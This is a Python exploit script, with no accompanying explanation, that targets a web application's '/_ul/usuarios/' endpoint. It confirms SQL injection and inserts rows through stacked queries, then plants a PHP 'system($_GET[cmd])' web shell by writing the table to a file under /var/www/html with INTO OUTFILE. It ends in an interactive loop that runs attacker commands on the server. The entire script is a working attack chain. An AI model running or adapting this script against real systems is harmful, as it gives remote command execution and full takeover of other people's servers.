import sys
import requests
import urllib

domain = input("[!]- Domain> ")
url = "http://"+domain+"/_ul/usuarios/0"

print("[!]- Testing URL")
req1 = requests.get(url).status_code
if req1 == 200:
    print("[OK]- status code 200!")
else:
    print("[!]- Error!",req1)
    sys.exit()

#---
req2 = requests.get("http://"+domain+"/_ul/usuarios/'").text
if "You have an error in your SQL syntax" in req2:
    print("[OK]- SQL error found!")
else:
    print("[!]- Error! No SQL error found!")
    sys.exit()
#---

print("[!]- Testing insertion!")
req3 = requests.get("http://"+domain+"/_ul/usuarios/1%3B%20insert%20into%20usuarios%20%28nome%29%20values%20%28%27pastel%27%29%3B").status_code
if req3 == 200:
    print("[OK]- Status code 200!")
    req4 = requests.get(url).text
    if 'pastel' in req4:
        print("[OK]- Injection Completed!")
    else:
        print("[!]- Error! Injected value could not be found!")
        sys.exit()
else:
    print("[!]- Error! Status code error!")
    sys.exit()

#---
print("[!]- Injecting system shell!")
req5 = requests.get("http://"+domain+"/_ul/usuarios/1%3B%20insert%20into%20usuarios%20%28nome%29%20values%20%28%27%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3F%3E%27%29%3B").status_code
if req5 == 200:
    print("[OK]- Status code 200!")
else:
    print("[!]- Error! Status code error!")
    sys.exit()

print("[OK]- Moving shell into a file!")
req6 = requests.get("http://"+domain+"/_ul/usuarios/1%3Bselect%20%2A%20from%20usuarios%20into%20outfile%20%27%2Fvar%2Fwww%2Fhtml%2Fclasses%2Fshell.class.php%27").status_code
if req6 == 200:
    print("[OK]- Status code 200!")
else:
    print("[!]- Error! Status code error!")
    sys.exit()

print("[OK]- Init shell!")
while True:
    cmm = input("cmd> ")
    r = requests.post("http://"+domain+"/_ul/shell?cmd="+urllib.parse.quote_plus(cmm)).text
    print(r)